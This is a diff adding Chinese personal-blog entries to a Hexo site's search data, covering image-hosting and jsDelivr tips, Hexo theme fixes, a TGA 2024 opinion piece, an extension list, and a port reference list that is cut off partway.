+        <content type="html"><![CDATA[<blockquote><p>更改</p></blockquote><p>上传部分图片到图床<br>开放photo<br>调整图片显示格式，使宽度一致且并排显示</p><p><a href="/photo/collection">自制基础交错式瀑布流</a><br>布局还不是很完善，图片数量多，且均未上传图床，<del>点击需谨慎</del><br>(图片加载的问题又得到了新的解决，点<a href="../%E7%BD%91%E7%AB%99%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98">上一篇文章</a>查看)</p><blockquote><p>追加</p></blockquote><p>很遗憾，新方法连接并不稳定，依旧不如国内的服务器，有时候觉得这堵墙真的好麻烦</p><blockquote><p>再追加</p></blockquote><p>关于连接方式的问题和调整详见上一篇文章末尾</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网站中的图片显示问题</title>
+      <link href="/2024/12/15/%E7%BD%91%E7%AB%99%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/"/>
+      <url>/2024/12/15/%E7%BD%91%E7%AB%99%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
+      
+        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>先前网站目录列表包含了一个动图和一张高清图片，每次打开加载的很慢，动图甚至会卡得只剩几帧。</p><h2 id="图片加载除网速外，还跟图片自身质量和托管图片的服务器有关。"><a href="#图片加载除网速外，还跟图片自身质量和托管图片的服务器有关。" class="headerlink" title="图片加载除网速外，还跟图片自身质量和托管图片的服务器有关。"></a>图片加载除网速外，还跟图片自身质量和托管图片的服务器有关。</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work">渲染页面：浏览器的工作原理</a></p><p>首先我尝试压缩高清图片的质量，但效果并不显著，反而图片模糊得看不清了，原因可能是动图加载在加载过程中占了大部分线程。</p><h3 id="图片压缩"><a href="#图片压缩" class="headerlink" title="图片压缩"></a>图片压缩</h3><p>Photoshop压缩： 文件&gt;导出&gt;存储为web所用的格式 在这里你可以选择压缩大小和颜色数量，并通过预览查看压缩后的大小。<br>Asprite压缩： 小体积图片或动图格式的文件快速压缩，选择导出处的比例，或者添加脚本自定义压缩。</p><p>但是本站引用网络上的高清图片加载的却很快，猜想如果把图片上传到国内服务器，然后引用该图片链接，可以加快页面和图片加载速度。</p><h3 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h3><p>不同图床试验并没有发现明显速度差异，但图床还有被封，丢失的风险，因此在这里放图片做比较<br>(hello公益版图床即将过期，2024&#x2F;12&#x2F;19注)<br>免费图床无需登录：<br>    <a href="https://www.helloimg.com/?lang=zh-CN">hello图床</a> 每张最大上传5MB，测速良好<br>    <img src="https://www.helloimg.com/i/2024/12/15/675e621bf16e9.jpg" alt="hello"><br>    <a href="https://picui.cn/">picui图床</a>每张最大上传10MB，一次最多5张，服务器不在国内，速度较慢<br>    <img src="https://img.picui.cn/free/2024/12/15/675e61c397289.jpg" alt="picui"><br><span style='color:grey;font-size:smaller'><br>其他图床有的需要注册，有的服务器在国外，就不试了。<br></span><br>图片上传后再引用生成的链接，网页就快很多了。</p><h3 id="jsdelivr加速"><a href="#jsdelivr加速" class="headerlink" title="jsdelivr加速"></a>jsdelivr加速</h3><p>然而，有时候图片数量庞大，如果此时一个一个去上传获取链接再引用过来，未免也太麻烦了。<br>并且图床也不是很安全，有时候图片会丢失，如果不注册，管理起来也不方便。</p><p><a href="https://www.cnblogs.com/lfri/p/12212878.html">jsdelivr</a>是一个快速免费的公用cdn，它能加速外网服务器资源的获取。<br>具体使用方法如下：</p><pre><code>https://cdn.jsdelivr.net/gh/&lt;用户名&gt;/&lt;仓库名&gt;@&lt;发布版本号&gt;/&lt;文件路径&gt;</code></pre><p>这个链接获取资源的速度会快许多，因此用这个链接批量访问我们托管在github的图床就能够很快的展示图片了，同时也能跟本地的脚本很好地搭配使用。</p><p>放一个快速获取图片链接的python代码</p><pre><code class="python">def generate_image_markdown(folder_path, output_file):    # 支持的图片格式    image_extensions = [&#39;.jpg&#39;, &#39;.jpeg&#39;, &#39;.png&#39;, &#39;.gif&#39;]        # 打开输出文件    with open(output_file, &#39;w&#39;, encoding=&#39;utf-8&#39;) as outfile:        # 遍历文件夹中的所有文件        for filename in os.listdir(folder_path):            # 检查文件是否是图片            if any(filename.lower().endswith(ext) for ext in image_extensions):                # 写入html格式的图片引用                outfile.write(f&#39;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/sanqi-normal/sanqi-normal.github.io/photo/collection/img_right/&#123;filename&#125;&quot;&gt;\n&#39;)</code></pre><p>这样一来，上传图片就变得非常轻松容易</p><blockquote></blockquote><p>所以，日常博客可以直接拖图片上传到公共图库，数量非常多的图片可以上传到GitHub后使用jsdelivr加速获取<br><img src="https://www.helloimg.com/i/2024/12/15/675eb7a6684d7.png"></p><blockquote><p>追加</p></blockquote><p>使用jsdelivr加速后一开始打开正常，后来发现打不开了，查询后发现可能是加速cdn受到了dns污染，更换未受污染的子域名fastly.jsdelivr，目前尚不清楚效果如何</p><p>追加的追加：jsdelivr的子域名testingcf.jsdelivr.net使用正常，速度良好</p><p>追加的追加的追加： 现在你可以看到之前存在图床里的图片都丢了，所以说公共图床还是算了，没有办法长久。我许多问题的解决方法都卡在服务器这里，赶快放假吧，放假了一定要搭一个自己的服务器。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（6）</title>
+      <link href="/2024/12/13/%E6%97%A5%E5%BF%97%EF%BC%886%EF%BC%89/"/>
+      <url>/2024/12/13/%E6%97%A5%E5%BF%97%EF%BC%886%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<p>更改</p><blockquote><p>部分页面不展示评论</p></blockquote><p>评论的功能是通过插件实现的，每次加载页面会通过条件判断来展示评论内容，在判断内容中添加新定义的参数，并在需要取消评论的页面添加此参数，即可实现评论的展示和隐藏。</p><blockquote><p>Ai界面输入框禁用快捷键</p></blockquote><p>一无所知的我翻看了几天才熟悉这个主题的逻辑，然后琢磨着怎么把输入这个问题改改。</p><p>‘顺藤摸瓜’不大对，‘挨个翻找’才更准确，总之找到了相关逻辑的代码的位置。</p><p>最初尝试在一个隐藏的input中定义一个shortcutkey项，用来获取page的元素并提交一个布尔值给最终处理快捷键逻辑的地方，尝试失败，调试发现虽然页面源代码更新了，输入框内容没有更新。</p><p>查找资料并多次尝试，发现问题出在页面的跳转方式上——页面是异步跳转，更快，不需要完全重载浏览器，但这就导致有些参数值没能更新。</p><p>于是改跳转为当前页面跳转，会完全重载一次，发现奏效，于是修改完善。</p><p>目前离开ai界面没有重载，快捷键是禁用的，需要刷新一下界面。当然，最好的处理方式应该是在输入框聚焦时禁用快捷键，在不输入时启用。但是我貌似浪费太多时间了，学艺不精是这样的。</p><p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.2a05596eb480cadf9b57ac4033f9f006?rik=kjDB6pmvIpO8qg&riu=http://n.sinaimg.cn/front/63/w563h300/20181002/XnBI-hkrzyam6189734.jpg&ehk=igKQLmIlfYXlgZ1BMKZbrGNQnDGoTYSVdSUmXouEwEQ=&risl=&pid=ImgRaw&r=0"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于tga2024</title>
+      <link href="/2024/12/13/%E5%85%B3%E4%BA%8Etga2024/"/>
+      <url>/2024/12/13/%E5%85%B3%E4%BA%8Etga2024/</url>
+      
+        <content type="html"><![CDATA[<p>2024TGA的结果想必大家都知道了，没什么可说的，我和绝大多数人感受一样，但还是废话一下吧。</p><p>首先，能上TGA的都不会差，每个游戏都有自己突出的优势、特色和粉丝群体。</p><p>但是，最终那顶传说中得到了就能在游戏史重重留名的皇冠，是角逐，更是一场博弈，这场博弈会不由分说地牵进来更多与游戏不相关的东西。</p><p>在这场博弈中，无耻带来的损失远不及荣誉带来的利益多，我们又知道不是所有人都不在意袈裟的分量，那么结果就显而易见了。</p><p>利益是什么呢，是得奖吗？也许是。</p><p>但不妨想想看，虽然我们口口声声说着黑猴不得奖也一点不意外，但如果真得了呢？年度最佳颁奖现场会响起我们中国游戏的音乐，冯骥和杨奇上台用中文讲话，游科跻身知名大厂，更多中国单机游戏走向海外市场，打出自己的品牌，中国多少年轻人燃起登上最佳游戏颁奖台的梦想。想想都激动人心。</p><p>但是没有。换成他们的角度，这太可怕了，这不能发生。敌人的损失就是我们的利益。</p><p>然后，他们跳过了重制版和dlc，把奖颁给了sony的小机器人。嗯。离谱。</p><p>‘反正事情都已经做到这个份上了。’ 他们会是这么想的吗</p><p>TGA这么做了不会削减它的权威性吗？TGA这么做正是因为它是权威，如果它是IGN、金摇杆，结果也会毫无例外的相同。</p><p>不过，再重复一下，没有差的，小机器人只是被放在了本不属于它的位置，因而成了众矢之的。</p><p>就这样吧，最后再回顾我们的2024游戏界的人类群星闪耀时。</p><p>黑神话：悟空！</p><p><img src="https://www.vgfront.com/uploadfile/cover/202301/c52aac05a96c6eb.jpg" alt="黑神话：悟空"></p><p>暗喻幻想！</p><p><img src="https://image.gcores.com/94639e886c442e87d5a5308fca306518-1920-1080.jpg?x-oss-process=image/resize,limit_1,m_lfit,w_1600/quality,q_90/format,webp" alt="暗喻幻想"></p><p>最终幻想7重生！</p><p><img src="https://img9.doubanio.com/lpic/s34156793.jpg" alt="最终幻想7重生"></p><p>艾尔登法环：黄金树幽影！</p><p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.44c1faebc1942df18619eea7c2a111e3?rik=JH+5KkM93UfK+g&riu=http://news.yxrb.net/uploadfile/2023/0228/16775829327eca17.png&ehk=GiT8SMNrjLeIRJVEBJkW3ncR9ozMorN7IdGz88nbZrA=&risl=&pid=ImgRaw&r=0" alt="艾尔登法环：黄金树幽影"></p><p>宇宙机器人！</p><p><img src="https://img.3dmgame.com/uploads/images/news/20240715/1721011189_877125.jpg" alt="宇宙机器人"></p><p>小丑牌！</p><p><img src="https://tse2-mm.cn.bing.net/th/id/OIP-C.Eb_nzKzwK8z5ZGLTdWyONAHaEK?rs=1&pid=ImgDetMain" alt="小丑牌"></p><p>每一部用心创作的作品都值得尊敬，至于TGA，我们祝他好死。</p><span style='font-size:smaller;'>图源自网络，侵权删。</span>]]></content>
+      
+      
+      <categories>
+          
+          <category> 游戏 </category>
+          
+          <category> 评测 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 游戏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（5）评论测试</title>
+      <link href="/2024/12/12/%E6%97%A5%E5%BF%97%EF%BC%885%EF%BC%89/"/>
+      <url>/2024/12/12/%E6%97%A5%E5%BF%97%EF%BC%885%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>试运行</p></blockquote><p>增添评论功能 欢迎评论</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+            <tag> 评论 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于hexo修改主题文件无法正确生成页面的解决办法</title>
+      <link href="/2024/12/12/%E5%85%B3%E4%BA%8Ehexo%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%AD%A3%E7%A1%AE%E7%94%9F%E6%88%90%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
+      <url>/2024/12/12/%E5%85%B3%E4%BA%8Ehexo%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%AD%A3%E7%A1%AE%E7%94%9F%E6%88%90%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<p>修改博客配置过程中发现即使本地呈现的效果正确，上传至github pages后，更改并没有应用在页面上。</p><p>一开始我以为是缓存的问题，执行  <code>hexo clean</code>命令后，发现并没有解决问题。</p><p>后来排查锁定问题出现在执行  <code>hexo g</code>这一过程中，文件没有被正确生成，于是取消勾选主题文件及子文件属性的只读。重新执行   <code>hexo clean</code> <code>hexo g -d</code>  命令，此域名页面修改成功。</p><p>尽管问题不在缓存上，缓存依旧是遇到问题需要思考的可能性之一，再遇到本地与线上不一致的情况，可以尝试清除缓存。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>电脑浏览手机端格式网页方法</title>
+      <link href="/2024/12/12/%E7%94%B5%E8%84%91%E6%B5%8F%E8%A7%88%E6%89%8B%E6%9C%BA%E7%AB%AF%E7%BD%91%E9%A1%B5%E6%96%B9%E6%B3%95/"/>
+      <url>/2024/12/12/%E7%94%B5%E8%84%91%E6%B5%8F%E8%A7%88%E6%89%8B%E6%9C%BA%E7%AB%AF%E7%BD%91%E9%A1%B5%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<p>想要调试手机端的网页效果，github又有延迟，每次都提交有些麻烦</p><p>除了使用模拟器之外，可以在打开的网页按F12打开控制台，然后点击切换设备仿真按钮或按下快捷键Ctrl+Shift+M，然后在尺寸处调整型号，即可浏览手机端网页。<br><span style='color:grey;'><br>因为懒，就不配图了 XD<br></span></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（4）</title>
+      <link href="/2024/12/12/%E6%97%A5%E5%BF%97%EF%BC%884%EF%BC%89/"/>
+      <url>/2024/12/12/%E6%97%A5%E5%BF%97%EF%BC%884%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<p>借助ai对主题代码进行了逐个解析，相信对之后修改是有帮助的</p><blockquote><p>更改</p></blockquote><p>增加音乐播放器插件<br>   &emsp;&emsp;增加了边缘移动</p><p>更改部分配色(配色更改测试2，更改成功)</p><blockquote><p>测试中</p></blockquote><p>AI输入框输入时禁用页面快捷键</p><p>为mobile添加返回默认列表栏的按钮</p><p>mobile端退回时先退回列表再退出</p><span style='color:grey;font-size='>&emsp; 事实上我发现因为我没有前后端基础，这几个想法都有点难度，那不如先学点简单的东西，一边学一边改。</span><p>……我是不是沉迷写博客把正经事忘了。</p><br/><br/><p>事已至此，那就专心写博客好了。</p><p><img src="https://img.zjjcts.com/uploadimg/image/20210127/1611732187523.gif"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+            <tag> 测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>blog_theme</title>
+      <link href="/2024/12/12/blog-theme/"/>
+      <url>/2024/12/12/blog-theme/</url>
+      
+        <content type="html"><![CDATA[<h2 id="3-hexo主题代码解析"><a href="#3-hexo主题代码解析" class="headerlink" title="3-hexo主题代码解析"></a>3-hexo主题代码解析</h2><p>在这里记录下3-hexo主题代码的解析，以便之后更改和添加配置</p><p>开始之前</p><pre><code>.git 包含了 Git 仓库的所有元数据和对象数据库，用于跟踪和管理项目的版本历史.gitkeep 防止Git忽略空文件夹.gitignore 存放应当忽略的文件类型.yml (非)标记语言YAML.md 标记语言Markdown.css 样式语言CSS.styl 样式语言Stylus 编写CSS.ejs 前端嵌入式模板语言Embedded JavaScript 一般来说调整参数不应该来这里 不过也许可以借此改变页面结构</code></pre><h2 id="文件夹结构"><a href="#文件夹结构" class="headerlink" title="文件夹结构"></a>文件夹结构</h2><p>  &emsp;  .github 存放Bug报告<br>  &emsp;  layout 布局<br>  &emsp;   &emsp;  _partial<br>  &emsp;   &emsp;   &emsp; comments.ejs 评论模板<br>  &emsp;   &emsp;   &emsp; 其他模板 </p><p>  &emsp;   &emsp;  post.ejs 文章页面结构 不可调参<br>  &emsp;   &emsp;  index.ejs 主页页面模板 不可调参<br>  &emsp;   &emsp;  indexs.md 主页面</p><p>  &emsp;  source<br>  &emsp;   &emsp;  css<br>  &emsp;  &emsp;  &emsp;_partial<br>  &emsp;  &emsp;  &emsp;  &emsp;<a href="#stylepart">styl局部样式文件</a><br>  &emsp;  &emsp;  &emsp;fonts 字体和图标文件<br>  &emsp;  &emsp;  &emsp;hl_themes 代码高亮主题<br>  &emsp;  &emsp;  &emsp;gitalk.css Gitalk评论插件样式文件<br>  &emsp;  &emsp;  &emsp;<a href="#mobile">mobile.styl</a> 移动端样式文件<br>  &emsp;  &emsp;  &emsp;<a href="#style">style.styl</a> 文章样式文件<br>  &emsp;   &emsp;  js<br>  &emsp;  &emsp;  &emsp;js<a href="#script">全局</a>和<a href="#%E5%85%B6%E4%BB%96%E8%84%9A%E6%9C%AC">局部</a>脚本文件<br>  &emsp;   &emsp;  img 图片存放</p><p>  &emsp;  <a href="#config">_config.yml 配置文件</a></p><h2 id="script"><a href="#script" class="headerlink" title="script"></a>script</h2><p>自定义 jQuery 选择器方法<br>博客路径处理<br>PJAX 页面加载<br>根据当前路径设置文章背景。<br>渲染 MathJax 数学公式。<br>新内容淡入，绑定事件，获取评论数。<br>切换文章分类：清空搜索框，显示当前分类面板，隐藏大纲列表。<br>展开子类：点击折叠按钮时，展开或收起子类，并调整子类列表的高度。<br>鼠标移出文章列表后去掉 hover 样式：<br>快捷键处理<br>搜索框输入事件处理<br>隐藏&#x2F;显示文章列表：点击按钮时，切换文章列表的显示与隐藏状态。<br>同步大纲位置：根据页面滚动位置，同步大纲列表的激活项。<br>页面初始化：绑定事件，渲染高亮代码块，初始化文章相关内容。<br>监测滚动事件，同步大纲位置。<br>标签面板处理：切换标签面板的显示与隐藏,根据输入的标签过滤标签列表。<br>点击按钮时，回到默认面板，隐藏其他面板。<br>点击按钮时，切换到大纲视图，显示文章的大纲结构。<br>绑定文章内标签、分类、作者的点击事件，实现搜索功能。<br>初始化文章的目录结构，并绑定目录项的点击事件。<br>图片处理：点击图片时，放大图片并支持点击关闭。<br>复制代码功能：点击“复制代码”按钮时，将代码复制到剪贴板，并显示复制成功的提示。</p><h2 id="其他脚本"><a href="#其他脚本" class="headerlink" title="其他脚本"></a>其他脚本</h2><pre><code>### gitalk.js Gitalk评论插件### gitment.js Gitment评论插件### iconfont.js 字体图标库### jquery.pjax.js 页面加载插件### mathjax.js 数学公式渲染插件</code></pre><h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>版本号<br>头像和图标<br>博客路径<br>链接图标<br>是否在分类中显示文章数量。<br>是否开启多级分类。<br>配置分类的层级结构。<br>设置不同屏幕宽度下的分类宽度。<br>是否启用快捷键功能<br>自定义菜单：<br>文末声明<br>底部版权信息<br>底部备案号<br>字数统计<br>是否开启字数统计功能。<br>网站计数<br>设置文章目录的最大级数。<br>设置文章列表标题的颜色。<br>设置文章发布日期的颜色。<br>设置鼠标悬停时的背景色和文字颜色。<br>是否开启文章列表背景图。<br>设置背景图的路径。<br>设置背景图的透明度。<br>设置文章列表的样式<br>设置引用块的样式<br>设置表格的样式<br>设置首页背景图<br>设置其他页面背景图。<br>设置点击图片放大的样式<br>代码高亮<br>数学公式渲染<br>图表渲染<br>评论设置：<br>是否开启评论功能。<br>选择评论系统<br>是否在文章标题下方显示评论数。<br>配置各评论系统参数<br>配置各库CDN 地址</p><h2 id="style"><a href="#style" class="headerlink" title="style"></a>style</h2><p>全局样式设置：</p><blockquote><p>设置 html 和 body 的宽度、高度、字体、颜色等基本样式。<br>禁用页面滚动，确保页面内容不会溢出。</p></blockquote><p>链接样式：</p><blockquote><p>设置链接的颜色继承父元素，去除下划线，添加鼠标悬停时的颜色过渡效果。</p></blockquote><p>标题样式：</p><blockquote><p>设置 h1 到 h6 标题的颜色、行高、上下边距等样式。<br>为 h1 和 h2 添加特定的字体大小和底部边框。</p></blockquote><p>导航栏样式：</p><blockquote><p>设置导航栏的宽度、高度、背景色等基本样式。<br>添加导航栏在全屏模式下的隐藏效果，并设置鼠标悬停时的过渡效果。</p></blockquote><p>隐藏列表样式：</p><blockquote><p>设置隐藏列表的初始状态为隐藏，并添加全屏模式下的样式变化。<br>设置半圆形的按钮样式，用于显示或隐藏列表。</p></blockquote><p>图片放大效果：</p><blockquote><p>设置图片放大时的固定位置和过渡效果，确保图片在放大时能够居中显示。</p></blockquote><p>移动端菜单样式：</p><blockquote><p>设置移动端菜单的初始状态为隐藏，并添加显示时的过渡效果。<br>设置菜单按钮的样式，确保在移动设备上能够正确显示和隐藏。</p></blockquote><p>导入移动端样式文件 mobile.styl，以确保在不同设备上显示一致。</p><h2 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h2><p>对style做了调整</p><h2 id="stylepart"><a href="#stylepart" class="headerlink" title="stylepart"></a>stylepart</h2><pre><code>### comment.styl 评论样式### font.styl 字体样式### fade.styl 淡入淡出动画效果### full-toc.styl 回到顶部和全屏两个按钮### nav-left.styl 左侧导航栏样式### nav-right.styl 右侧导航栏样式### post.styl 文章样式### nprogress.styl 页面加载进度条样式### num-load.styl 加载动画</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+            <tag> 前端 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>扩展工具</title>
+      <link href="/2024/12/12/%E6%89%A9%E5%B1%95/"/>
+      <url>/2024/12/12/%E6%89%A9%E5%B1%95/</url>
+      
+        <content type="html"><![CDATA[<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>窗口置顶： TopMost<br>全机搜索： Everything<br>解压神器： 7-Zip</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p><a href="https://www.tampermonkey.net/">篡改猴</a><br><a href="https://update.greasyfork.org/scripts/378351/%E3%80%8CCSDNGreener%E3%80%8D%F0%9F%8D%83CSDN%E5%B9%BF%E5%91%8A%E5%AE%8C%E5%85%A8%E8%BF%87%E6%BB%A4%7C%E5%85%8D%E7%99%BB%E5%BD%95%7C%E4%B8%AA%E6%80%A7%E5%8C%96%E6%8E%92%E7%89%88%7C%E6%9C%80%E5%BC%BA%E8%80%81%E7%89%8C%E8%84%9A%E6%9C%AC%7C%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.user.js">CSDN界面优化</a>（油猴脚本）<br><a href="https://privacybadger.org/">隐私獾</a><br><a href="https://getfoxyproxy.org/">火狐代理</a><br><a href="https://www.whatruns.com/?source=plugin">WhatRuns</a><br><a href="https://gitcode.com/Resource-Bundle-Collection/82830/overview?utm_source=pan_gitcode&index=top&type=card&webUrl&isLogin=1">ModHeader（修改请求头）</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 扩展 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>端口笔记</title>
+      <link href="/2024/12/12/%E7%AB%AF%E5%8F%A3/"/>
+      <url>/2024/12/12/%E7%AB%AF%E5%8F%A3/</url>
+      
+        <content type="html"><![CDATA[<h2 id="所有端口一览"><a href="#所有端口一览" class="headerlink" title="所有端口一览"></a>所有端口一览</h2><p>查询 ctrl+F 输入端口数加空格</p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>0 端口：无效端口,通常用于分析操作系统<br>1 端口：传输控制协议端口服务多路开关选择器<br>2 端口：管理实用程序<br>3 端口：压缩进程<br>5 端口：远程作业登录<br>7 端口：回显<br>9 端口：丢弃</p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>11 端口：在线用户<br>13 端口：时间<br>17 端口：每日引用<br>18 端口：消息发送协议<br>19 端口：字符发生器<br>20 端口：FTP 文件传输协议(默认数据口)<br>21 端口：FTP 文件传输协议(控制)<br>22 端口：SSH 远程登录协议<br>23 端口：telnet(终端仿真协议),木马 Tiny Telnet Server 开放此端口<br>24 端口：预留给个人用邮件系统<br>25 端口：SMTP 服务器所开放的端口，用于发送邮件<br>27 端口：NSW 用户系统 FE<br>29 端口：MSG ICP<br>31 端口：MSG 验证,木马 Master Paradise、HackersParadise 开放此端口<br>33 端口：显示支持协议<br>35 端口：预留给个人打印机服务<br>37 端口：时间<br>38 端口：路由访问协议<br>39 端口：资源定位协议<br>41 端口：图形<br>42 端口：主机名服务<br>43 端口：who is 服务<br>44 端口：MPM(消息处理模块)标志协议<br>45 端口：消息处理模块<br>46 端口：消息处理模块(默认发送口)<br>47 端口：NI FTP<br>48 端口：数码音频后台服务<br>49 端口：TACACS 登录主机协议<br>50 端口：远程邮件检查协议<br>51 端口：IMP(接口信息处理机)逻辑地址维护<br>52 端口：施乐网络服务系统时间协议<br>53 端口：dns 域名服务器<br>54 端口：施乐网络服务系统票据交换<br>55 端口：ISI 图形语言<br>56 端口：施乐网络服务系统验证<br>57 端口：预留个人用终端访问<br>58 端口：施乐网络服务系统邮件<br>59 端口：预留个人文件服务<br>60 端口：未定义<br>61 端口：NI 邮件<br>62 端口：异步通讯适配器服务<br>63 端口：whois++<br>64 端口：通讯接口<br>65 端口：TACACS 数据库服务<br>66 端口：Oracle SQL*NET<br>67 端口：引导程序协议服务端<br>68 端口：引导程序协议客户端<br>69 端口：小型文件传输协议<br>70 端口：信息检索协议<br>71 端口：远程作业服务<br>72 端口：远程作业服务<br>73 端口：远程作业服务<br>74 端口：远程作业服务<br>75 端口：预留给个人拨出服务<br>76 端口：分布式外部对象存储<br>77 端口：预留给个人远程作业输入服务<br>78 端口：修正 TCP<br>79 端口：查询远程主机在线用户等信息<br>80 端口：http,用于网页浏览,木马 Executor 开放此端口<br>81 端口：HOST2 名称服务<br>82 端口：传输实用程序<br>83 端口：模块化智能终端 ML 设备<br>84 端口：公用追踪设备<br>85 端口：模块化智能终端 ML 设备<br>86 端口：Micro Focus Cobol 编程语言<br>87 端口：预留给个人终端连接<br>88 端口：Kerberros 安全认证系统<br>89 端口：SU&#x2F;MIT telnet(终端仿真网关)<br>90 端口：DNSIX 安全属性标记图<br>91 端口：MIT Dover 假脱机<br>92 端口：网络打印协议<br>93 端口：设备控制协议<br>94 端口：Tivoli 对象调度<br>96 端口：DIXIE 协议规范<br>97 端口：快速远程虚拟文件协议<br>98 端口：TAC 新闻协议<br>99 端口：后门程序 ncx99 开放此端口</p><h3 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h3><p>100 端口：未知用途<br>101 端口：NIC 主机名称服务<br>102 端口：消息传输代理<br>103 端口：Genesis 点对点传输网络<br>105 端口：信箱名称服务<br>106 端口：3COM-TSMUX 开放端口<br>107 端口：远程 Telnet 服务<br>108 端口：SNA 网关访问服务<br>109 端口：POP2 服务器开放此端口,用于接收邮件<br>110 端口：POP3 服务器开放此端口,用于接收邮件<br>111 端口：SUN 公司的 RPC 服务所有端口<br>112 端口：McIDAS 数据传输协议<br>113 端口：认证服务，用于鉴别 TCP 连接的用户<br>114 端口：音频新闻多点服务<br>115 端口：简单文件传输服务<br>116 端口：ANSA REX 通知<br>117 端口：UUCP 路径服务<br>118 端口：SQL 服务<br>119 端口：NEWS 新闻组传输协议，承载 USENET 通信<br>121 端口：木马 BO jammerkillahV 开放端口<br>122 端口：SMAKY 网络<br>123 端口：网络时间协议，蠕虫病毒会利用，一般关闭<br>128 端口：GSS X 许可认证<br>129 端口：密码生成器协议<br>130 端口：Cisco 软件开放端口<br>131 端口：Cisco 软件开放端口<br>132 端口：Cisco 软件开放端口<br>133 端口：统计服务<br>134 端口：INGRES-网络服务<br>135 端口：DCOM 服务，冲击波病毒利用，不能关闭<br>136 端口：命名系统<br>137 端口：NETBIOS 协议应用，为共享开放<br>138 端口：NETBIOS 协议应用，为共享开放<br>139 端口：NETBIOS 协议应用，为共享开放<br>140 端口：EMFIS 数据服务<br>141 端口：EMFIS 控制服务<br>143 端口：Interim 邮件访问协议<br>144 端口：UMA 软件开放端口<br>145 端口：UAAC 协议<br>149 端口：AED 512 仿真服务<br>150 端口：SQL(结构化查询语言)-网络<br>152 端口：后台文件传输协议<br>156 端口：SQL(结构化查询语言)服务<br>158 端口：PC 邮件服务器<br>159 端口：NSS-路由<br>160 端口：SGMP-陷阱<br>161 端口：简单网络管理协议<br>162 端口：SNMP 陷阱<br>163 端口：CMIP&#x2F;TCP 管理<br>164 端口：CMIP&#x2F;TCP 代理<br>166 端口：Sirius 系统<br>169 端口：发送<br>170 端口：网络附言<br>177 端口：x 显示管理控制协议，入侵者通过它访问 X-windows 操作台<br>178 端口：NextStep Window 服务<br>179 端口：边界网关协议<br>180 端口：图表<br>181 端口：统一<br>184 端口：OC 